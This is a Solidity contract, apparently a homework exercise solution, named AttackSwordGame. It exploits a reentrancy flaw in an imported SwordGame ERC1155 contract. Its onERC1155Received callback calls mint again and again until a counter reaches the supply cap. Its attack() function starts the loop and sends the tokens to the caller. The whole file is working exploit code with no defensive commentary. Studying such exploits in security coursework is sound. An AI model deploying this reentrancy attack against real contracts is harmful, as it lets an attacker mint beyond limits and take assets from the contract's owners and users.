// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SwordGame} from "./hw1.sol";

contract AttackSwordGame {
    SwordGame public swordGame;
    uint256 public count;
    uint256 public maxSupply = 10;

    constructor(address _swordGame) {
        swordGame = SwordGame(_swordGame);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4) {
        count = count + _tokenId;

        while (count < maxSupply) {
            swordGame.mint{value: 1 ether}(1);
        }
        return this.onERC1155Received.selector;
    }

    receive() external payable {}

    function attack() external payable {
        swordGame.mint{value: 1 ether}(1);
        swordGame.safeTransferFrom(address(this), msg.sender, 1, maxSupply, "");
    }
}
